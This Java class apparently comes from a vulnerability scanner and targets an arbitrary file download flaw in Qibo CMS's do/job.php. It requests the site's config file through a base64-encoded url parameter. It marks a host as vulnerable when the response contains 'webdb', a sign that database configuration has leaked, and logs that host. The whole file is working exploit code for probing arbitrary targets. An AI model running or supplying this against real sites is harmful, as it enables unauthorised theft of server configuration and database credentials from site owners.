package action.url;

import java.util.HashMap;
import java.util.Map;

import tools.HttpConnectionUtils;
import tools.Logger;
import tools.StringMatcher;

public class QiboJobdownload {
	public void run(String target) {
		String host = target;
		target = standardization(target);
		
		if (host.endsWith("/"))
			host = host+"do/job.php?job=download&fid=76&id=64&rid=642&i_id=33&mid=101&field=softurl&ti=0&url=ZGF0YS9jb25maWcucGg8";
		else
			host = host+"/do/job.php?job=download&fid=76&id=64&rid=642&i_id=33&mid=101&field=softurl&ti=0&url=ZGF0YS9jb25maWcucGg8";
		
		if (check(host))
			Logger.getInstance().insertResult(target);
	}
	
	public static String standardization(String target) {
		if (!target.startsWith("http"))
			target = "http://"+target;
		
		return target;
	}
	
	private boolean check(String host) {
		HttpConnectionUtils utils = new HttpConnectionUtils();
		
		if (!utils.openConnection(host, "GET"))
			return false;
		
		String result = utils.readAllResponse();
		if (result == null)
			return false;
		
		if (StringMatcher.findString(result, "webdb", false))
			return true;
		
		return false;
	}
}
